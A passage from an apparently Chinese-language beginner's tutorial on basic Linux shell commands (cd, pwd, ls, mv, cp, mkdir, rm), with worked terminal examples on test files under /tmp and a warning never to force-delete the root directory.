<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ <span class="nb">cd</span> ../.. <span class="c1"># 从当前所在的目录/a/b/c返回上两级的目录/a</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost a<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwd命令">pwd命令</h2>
<p>这个命令是用来辅助上面的cd命令的，它的作用是查看当前所在的绝对路径。</p>
<h3 id="用法-1">用法</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost ~<span class="o">]</span>$ <span class="nb">pwd</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后</span>
</span></span><span class="line"><span class="cl">/home/weepingdogel
</span></span></code></pre></td></tr></table>
</div>
</div><p>假如当前所在目录为/a/b/c</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ <span class="nb">pwd</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后</span>
</span></span><span class="line"><span class="cl">/a/b/c
</span></span></code></pre></td></tr></table>
</div>
</div><p>虽然只有一个作用，但是却很重要，因为新手每天都会用到，bash或者部分zsh主题是不会显示绝对路就的，如果你不知道你当前在操作哪个目录，你就得用上pwd这个命令了。</p>
<h2 id="ls命令">ls命令</h2>
<p>这个命令相当于windows中的<strong>dir</strong>，作用是显示当前目录下的所有的文件和目录。</p>
<h3 id="用法-2">用法</h3>
<p>测试目录<code>/tmp/a/b/c</code></p>
<p>直接查看</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ ls <span class="c1"># 查看当前目录下面的文件</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后</span>
</span></span><span class="line"><span class="cl"><span class="m">223333</span>  文本.txt  <span class="nb">test</span>  wiaori <span class="c1"># 被列出的文件</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>列表式查看，参数-l</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ ls -l
</span></span><span class="line"><span class="cl"><span class="c1">#按下回车后</span>
</span></span><span class="line"><span class="cl">总用量 <span class="m">4</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 <span class="m">223333</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel <span class="m">11</span>  8月  <span class="m">5</span> 17:38 文本.txt
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 17:52 <span class="nb">test</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 wiaori
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>易读列表查看，参数-lh</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ ls -lh
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后</span>
</span></span><span class="line"><span class="cl">总用量 4.0K
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 <span class="m">223333</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel <span class="m">11</span>  8月  <span class="m">5</span> 17:38 文本.txt
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 17:52 <span class="nb">test</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 wiaori
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>按时间排序的易读列表查看，参数-lh &ndash;sort=time</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ ls -lh --sort<span class="o">=</span><span class="nb">time</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后</span>
</span></span><span class="line"><span class="cl">总用量 4.0K
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 17:52 <span class="nb">test</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 wiaori
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 <span class="m">223333</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel <span class="m">11</span>  8月  <span class="m">5</span> 17:38 文本.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>按文件大小排序的易读列表查看，参数-lh &ndash;sort=size</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ ls -lh --sort<span class="o">=</span>size
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后</span>
</span></span><span class="line"><span class="cl">总用量 4.0K
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 17:52 <span class="nb">test</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel <span class="m">11</span>  8月  <span class="m">5</span> 17:38 文本.txt
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 <span class="m">223333</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 wiaori
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>更多用法等你自己去摸索了</p>
<h2 id="文件复制与移动">文件复制与移动</h2>
<h3 id="mv命令">mv命令</h3>
<p>这个命令是英文单词<strong>move</strong>的缩写。</p>
<p>它的作用主要是移动某些文件到指定的位置，你可以指定绝对路径，但是如果离得比较近的话就可以使用相对路径。</p>
<h4 id="用法-3">用法</h4>
<h5 id="绝对路径用法">绝对路径用法：</h5>
<p>比如我们把 <strong>“目录c”</strong> 下面的 <strong>“文本.txt”</strong> 移动到<code>/tmp/a/</code>下面</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ mv /tmp/a/b/c/文本.txt /tmp/a/
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后，文件就被移动了</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来我们切换到<code>/tmp/a/</code>下面看看吧</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ <span class="nb">cd</span> /tmp/a
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost a<span class="o">]</span>$ ls
</span></span><span class="line"><span class="cl">文本.txt  b
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost a<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>此时我们就看到了那个 <strong>“文本.txt”</strong> 被移动到了<code>/tmp/a/</code>下面了。</p>
<h5 id="相对路径用法">相对路径用法：</h5>
<p>那么我们用另一种方法把这个文件移回去吧，首先我们还在这个<code>/tmp/a/</code>下面，那么命令如下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost a<span class="o">]</span>$ mv ./文本.txt ./b/c/
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后，文件就被移动了</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost a<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来我们回到<code>/tmp/a/b/c/</code>下面看看吧。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost a<span class="o">]</span>$ <span class="nb">cd</span> ./b/c
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ ls
</span></span><span class="line"><span class="cl"><span class="m">223333</span>  文本.txt  <span class="nb">test</span>  wiaori
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>看到了没有，它又回来了。</p>
<h3 id="cp命令">cp命令</h3>
<p>哈哈，这个命令也不是那个cp的意思，它是  <strong>“copy”</strong> 的缩写，复制的意思。</p>
<p>顾名思义，它的作用就是把一个文件复制到另一个地方。它同样有指定绝对路径和相对路径的两种用法。来尝试一下？</p>
<h4 id="用法-4">用法</h4>
<h5 id="绝对路径">绝对路径：</h5>
<p>我们来试试把<code>/tmp/a/b/c/文本.txt</code>这个文件复制到<code>/tmp/a/</code>下面</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ cp /tmp/a/b/c/文本.txt /tmp/a/
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车后，文件就被复制了</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ <span class="nb">cd</span> ../.. <span class="c1"># 我们来看看它是否被复制成功</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost a<span class="o">]</span>$ ls -lh <span class="c1"># 使用ls命令看一下，可见他是被复制成功的，创建日期与上面不一样。</span>
</span></span><span class="line"><span class="cl">总用量 4.0K
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel <span class="m">11</span>  8月  <span class="m">5</span> 18:36 文本.txt
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> weepingdogel weepingdogel <span class="m">60</span>  8月  <span class="m">5</span> 17:37 b
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost a<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>注意：此命令如果不使用高级用法是无法复制创建时间和所有者的</p>
</blockquote>
<h5 id="相对路径">相对路径：</h5>
<p>嘿嘿，我们尝试给/tmp/a/的每一级目录都复制一份吧。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost a<span class="o">]</span>$ cp ./文本.txt ./b/ <span class="c1"># 先复制到目录b</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost a<span class="o">]</span>$ cp ./文本.txt ./b/c/ <span class="c1"># 复制到目录c</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost a<span class="o">]</span>$ cp ./文本.txt ../ <span class="c1"># 复制到/tmp/下面</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost a<span class="o">]</span>$ <span class="nb">cd</span> .. <span class="c1"># 回到/tmp下面</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost tmp<span class="o">]</span>$ ls -lh <span class="c1"># 查看是否复制成功，可见第一个就是该文件</span>
</span></span><span class="line"><span class="cl">总用量 4.0K
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel <span class="m">11</span>  8月  <span class="m">5</span> 18:48  文本.txt
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> weepingdogel weepingdogel <span class="m">80</span>  8月  <span class="m">5</span> 18:36  a
</span></span><span class="line"><span class="cl"><span class="c1"># 接下来一级一级往下看</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost tmp<span class="o">]</span>$ ls -lh ./a
</span></span><span class="line"><span class="cl">总用量 4.0K
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel <span class="m">11</span>  8月  <span class="m">5</span> 18:36 文本.txt
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> weepingdogel weepingdogel <span class="m">80</span>  8月  <span class="m">5</span> 18:45 b
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost tmp<span class="o">]</span>$ ls -lh ./a/b
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">11</span>  8月  <span class="m">5</span> 18:45 文本.txt
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> weepingdogel weepingdogel <span class="m">120</span>  8月  <span class="m">5</span> 18:25 c
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost tmp<span class="o">]</span>$ ls -lh ./a/b/c
</span></span><span class="line"><span class="cl">总用量 4.0K
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 <span class="m">223333</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel <span class="m">11</span>  8月  <span class="m">5</span> 18:47 文本.txt
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 17:52 <span class="nb">test</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 wiaori
</span></span></code></pre></td></tr></table>
</div>
</div><p>可见，复制是成功的。</p>
<blockquote>
<p>注意：如果要复制目录，请在指定目录前加上参数-r，否则将无法复制</p>
</blockquote>
<h2 id="mkdir命令">mkdir命令</h2>
<p>这个命令是 <strong>“make directory”</strong> 的缩写，意为创建一个目录它一般情况下有两种用法</p>
<ol>
<li>一般创建，直接在已存在的绝对路径或相对路径创建一个目录</li>
<li>递归创建，创建一连串目录，在创建之前有一级或以上的目录未被创建</li>
</ol>
<p>同样也是可以指定绝对路径和相对路径的，接下来我就只写出相对路径的示例了，因为方便。</p>
<p>来尝试一下？</p>
<h3 id="用法-5">用法</h3>
<h4 id="一般创建">一般创建</h4>
<p>假设目录<code>/tmp/a/b/c</code></p>
<p>我们要创建一个目录<code>d</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ mkdir ./d <span class="c1"># 在/tmp/a/b/c/下面创建一个目录d</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车之后，目录就创建了，我们可以用ls来检查一下</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ ls -lh
</span></span><span class="line"><span class="cl">总用量 4.0K
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 <span class="m">223333</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel <span class="m">11</span>  8月  <span class="m">5</span> 18:47 文本.txt
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 19:07 d
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 17:52 <span class="nb">test</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 wiaori
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>可见，目录被成功创建了。</p>
<h4 id="递归创建">递归创建</h4>
<p>假设目录<code>/tmp/a/b/c</code></p>
<p>我们要在当前目录下创建一串目录，比如<code>./go/for/it</code>，此时我们就要加个参数<code>-p</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ mkdir -p ./go/fot/it
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车之后，一串目录就被创建了，接下来我们会一级一级的查看</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ ls -lh 
</span></span><span class="line"><span class="cl">总用量 4.0K
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 <span class="m">223333</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel <span class="m">11</span>  8月  <span class="m">5</span> 18:47 文本.txt
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 19:07 d
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> weepingdogel weepingdogel <span class="m">60</span>  8月  <span class="m">5</span> 19:14 go
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 17:52 <span class="nb">test</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 wiaori
</span></span><span class="line"><span class="cl"><span class="c1"># 可见我们看见了目录go</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ <span class="nb">cd</span> ./go <span class="c1"># 我们试着进入这个目录，可见我们成功进入了目录</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost go<span class="o">]</span>$ ls -lh <span class="c1">#继续查看下一级</span>
</span></span><span class="line"><span class="cl">总用量 <span class="m">0</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> weepingdogel weepingdogel <span class="m">60</span>  8月  <span class="m">5</span> 19:14 <span class="k">for</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost go<span class="o">]</span>$ <span class="nb">cd</span> ./for <span class="c1">#进入目录for</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost <span class="k">for</span><span class="o">]</span>$ ls -lh <span class="c1"># 继续查看下一级</span>
</span></span><span class="line"><span class="cl">总用量 <span class="m">0</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 19:14 it
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost <span class="k">for</span><span class="o">]</span>$ <span class="nb">cd</span> ./it <span class="c1">#接下来我们进入这个目录it，由于it里面是空的，所以就不用ls查看了</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost it<span class="o">]</span>$ <span class="nb">pwd</span> <span class="c1">#使用pwd查看当前位置</span>
</span></span><span class="line"><span class="cl">/tmp/a/b/c/go/for/it
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost it<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><p>可见这一串目录也创建成功了。</p>
<h2 id="rm命令">rm命令</h2>
<blockquote>
<p>注意:此命令如果使用不当十分危险</p>
</blockquote>
<p>这个命令是 <strong>“remove”</strong> 的缩写，意为删除，作用上和windows中的del命令差不多，但是用法和参数却有所不同，而且诶这个命令如果使用不当是十分危险的，因为在Linux中，就算是正在被使用的文件也可以被删除，并不会有windows那种保姆级别的”拒绝访问”。</p>
<h3 id="用法-6">用法</h3>
<p>假设目录<code>/tmp/a/b/c</code></p>
<h4 id="删除文件">删除文件</h4>
<p>我们来尝试删除一下<code>文本.txt</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ rm ./文本.txt
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车之后这个文件就被删除了</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ ls
</span></span><span class="line"><span class="cl"><span class="m">223333</span>  d  go  <span class="nb">test</span>  wiaori
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="删除目录">删除目录</h4>
<p>如果你要删除一个目录，比如go，就需要加一个参数-r</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ rm -r ./go
</span></span><span class="line"><span class="cl"><span class="c1"># 按下回车之后，这个目录就被删除了</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$ ls -lh <span class="c1">#查看一下就可以看到，go也不见了</span>
</span></span><span class="line"><span class="cl">总用量 <span class="m">0</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 <span class="m">223333</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 19:07 d
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> weepingdogel weepingdogel <span class="m">40</span>  8月  <span class="m">5</span> 17:52 <span class="nb">test</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> weepingdogel weepingdogel  <span class="m">0</span>  8月  <span class="m">5</span> 17:52 wiaori
</span></span><span class="line"><span class="cl"><span class="o">[</span>weepingdogel@localhost c<span class="o">]</span>$
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="强制删除危险">强制删除|危险|</h4>
<p>如果你需要强制删除一个文件，则需要调用root权限，并且使用<code>-rf</code>参数。</p>
<blockquote>
<p>注意，千万不要用这个命令去删除 <code>/</code>目录，否则你的系统将会自杀</p>
</blockquote>
<p>比如我们要删除<code>223333</code>这个文件</p>
